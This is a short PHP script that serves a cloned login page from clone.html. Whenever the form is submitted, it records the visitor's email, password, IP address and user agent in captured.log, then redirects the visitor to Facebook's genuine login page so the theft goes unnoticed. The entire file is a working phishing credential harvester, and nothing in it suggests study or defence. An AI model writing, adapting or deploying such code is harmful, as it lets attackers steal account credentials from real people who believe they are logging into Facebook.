<?php
$dir = __DIR__;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $row = date('c')." | IP=".$_SERVER['REMOTE_ADDR'].
           " | UA=".$_SERVER['HTTP_USER_AGENT'].
           " | user=".$_POST['email'].
           " | pass=".$_POST['pass']."\n";
    file_put_contents("$dir/captured.log", $row, FILE_APPEND);
    header("Location: https://www.facebook.com/login/device-based/regular/login/");
    exit;
}
readfile("$dir/clone.html");